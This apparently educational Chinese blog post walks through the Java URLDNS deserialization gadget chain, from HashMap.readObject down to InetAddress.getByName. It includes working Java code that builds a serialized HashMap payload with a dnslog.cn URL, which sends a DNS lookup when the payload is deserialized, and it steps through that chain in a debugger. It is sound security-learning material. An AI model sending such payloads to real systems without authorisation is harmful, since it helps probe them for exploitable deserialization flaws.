---
title: URLDNS利用链
date: 2023-04-01 20:44:51
tags: Java
cover: https://raw.githubusercontent.com/todis21/image/main/202304021635959.png
---

# URLDNS利用链

URLDNS利用链是java原生的一条利用链，通常用来验证是否存在反序列化漏洞，因为是原生的，所以不存在版本限制

特点:

- 不限制jdk版本，使用Java内置类，对第三方依赖没有要求
- 目标无回显，可以通过DNS请求来验证是否存在反序列化漏洞
- URLDNS利用链，只能发起DNS请求，并不能进行其他利用



## HashMap

HashMap 是一个存储键值对的容器。 每个键与一个值关联。 `HashMap`中的键必须唯一。 `HashMap`在其他编程语言中称为关联数组或词典。 `HashMaps`占用更多内存，因为每个值还有一个键。 删除和插入操作需要固定的时间。 `HashMaps`可以存储空值。

基本用法：

创建对象

```java
HashMap<String,Integer> hashMap = new HashMap<>();
```

添加键值对：

```java
hashMap.put("aa",1);
hashMap.put("bb",2);
hashMap.put("cc",3);
```

put方法会覆盖原有的value，而另一种put方法不会覆盖：putIfAbsent(key,value)

```java
hashMap.putIfAbsent("aa",4);
```

该方法首先会判断key是否存在，如果存在且value不为null，则不会覆盖原有的value，并返回原来的value；如果key不存在或者key的value为null，则会put进新值，并返回null。



## 原理：

`java.util.HashMap` 重写了 `readObject`, 在反序列化时会调用 `hash` 函数计算 key 的 hashCode.而 `java.net.URL` 的 hashCode 在计算时会调用 `getHostAddress` 来解析域名, 从而发出 DNS 请求

## 流程

**HashMap.readObject()-->HashMap.putVal()-->HashMap.hash()-->URL.hashcode()-->URLStreamHandler().hashCode().getHostAddress()-->URLStreamHandler().hashCode().getHostAddress().getByName()** 

```java
1. HashMap --> readObject()
2. HashMap --> hash()
3. URL --> hashCode()
4. URLStreamHandler --> hashCode()
5. URLStreamHandler --> getHostAddress()
6. InetAddress --> getByName()
```



## 代码

```java
import java.lang.reflect.Field;
import java.util.HashMap;
import java.net.URL;
import java.io.*;


public class Test {
    public static void main(String[] args) throws Exception {
    HashMap<URL,Object> hashMap=new HashMap<>();
    URL url = new URL("http://7zswrn.dnslog.cn");
    Field field= url.getClass().getDeclaredField("hashCode");
    field.setAccessible(true);
    field.set(url,123);
    hashMap.put(url,1);
    field.set(url,-1);

    new ObjectOutputStream(new FileOutputStream("bin.ser")).writeObject(hashMap);
    Object o = new ObjectInputStream(new FileInputStream("bin.ser")).readObject();
    System.out.println(o);
    }

}
```

运行时需要添加`--add-opens java.base/java.net=ALL-UNNAMED`  不然会报错

![image-20230402142752339](https://raw.githubusercontent.com/todis21/image/main/202304021427567.png)

## 流程分析

这个利用链的入口在HashMap里，它实现了Serializable接口，说明它支持序列化和反序列化

![image-20230402143132873](https://raw.githubusercontent.com/todis21/image/main/202304021636523.png)

在HashMap类中，它重写了readObjec()方法，在反序列化的执行过程中，就会优先执行这里的readObjec()方法



![image-20230402143855396](https://raw.githubusercontent.com/todis21/image/main/202304021636208.png)

然后跟着链子往下,这是readObjec()最后一行代码，调用了`putVal()`方法，参数中使用了`hash(key)`，这个`key`就行我们传进去的url

,即`http://7zswrn.dnslog.cn`

![image-20230402144047378](https://raw.githubusercontent.com/todis21/image/main/202304021636604.png)

跟进`hash()`方法,发现里面调用的是Object.hashCode()方法，但是这不是我们想要的

![image-20230402144603150](https://raw.githubusercontent.com/todis21/image/main/202304021636599.png)

需要调试获取我们想要的hashcode(),在`readObjec().putVal()`方法处下断点

![image-20230402145209616](https://raw.githubusercontent.com/todis21/image/main/202304021637404.png)

步进，看到key就是我们传入的参数url

![image-20230402145323587](https://raw.githubusercontent.com/todis21/image/main/202304021637991.png)

再步进，此时已经跳到了`URL`的hashCode()里面了，这里可以知道很清晰的代码逻辑，此时`hashCode==-1`,不会直接返回hashCode，而是执行`hashCode = handler.hashCode(this);`

![image-20230402150215474](https://raw.githubusercontent.com/todis21/image/main/202304021637711.png)

再步进，此时已经到了URLStreamHandler类，看到触发函数getHostAddress()

![image-20230402150338349](https://raw.githubusercontent.com/todis21/image/main/202304021637628.png)

继续步进，往下走，看到最终发起请求的方法`InetAddress.getByName()`

![image-20230402152803865](https://raw.githubusercontent.com/todis21/image/main/202304021637276.png)



![image-20230402153437447](https://raw.githubusercontent.com/todis21/image/main/202304021638093.png)

PS:刚刚的地址失效了，重新获取了地址olliao.dnslog.cn

![image-20230402154053223](https://raw.githubusercontent.com/todis21/image/main/202304021638558.png)





##  代码分析

先创建两个对象

```java
HashMap<URL,Object> hashMap=new HashMap<>();
URL url = new URL("http://olliao.dnslog.cn");//主角
```

添加键值对,值随便写

```java
hashMap.put(url,1);
```

看看put源码，会发现，它put方法里调用的hash(),key就是传进来的url,然后就是上面那套逻辑了

![image-20230402155135951](https://raw.githubusercontent.com/todis21/image/main/202304021638472.png)

URL中hashCode初始值为-1,说明还没有被初始化，初始化后会进行hash运算，hashCode的值会变成运算出来的hash

![image-20230402155719523](https://raw.githubusercontent.com/todis21/image/main/202304021638237.png)

此时会运行到这里执行hashCode(),然后就因为hashCode=-1发起请求包，还没反序列化就执行了

![image-20230402144603150](https://raw.githubusercontent.com/todis21/image/main/202304021638870.png)

所以要让它不发包，不能让hashCode=-1,导致进行发包请求.

通过Java反射获取hashCode,把他修改

```java
Field field= url.getClass().getDeclaredField("hashCode");
```

因为hashCode是`private`私有属性，不能直接修改，所以打开对该字段的访问权限，让hashCode可以被操作

```java
field.setAccessible(true);
```

将 url 对象的 hashCode 字段的值设置为 123,只要不是`-1`就行

```java
field.set(url,123);
```



在后面，需要反序列化去操作它的时候，再把hashCode的值改回`-1`,这样才会去走那段发请求的代码

```java
field.set(url,-1);
```



然后就是序列化和反序列化操作了

```java
new ObjectOutputStream(new FileOutputStream("bin.ser")).writeObject(hashMap);
Object o = new ObjectInputStream(new FileInputStream("bin.ser")).readObject();
System.out.println(o);//简单输出一下
```







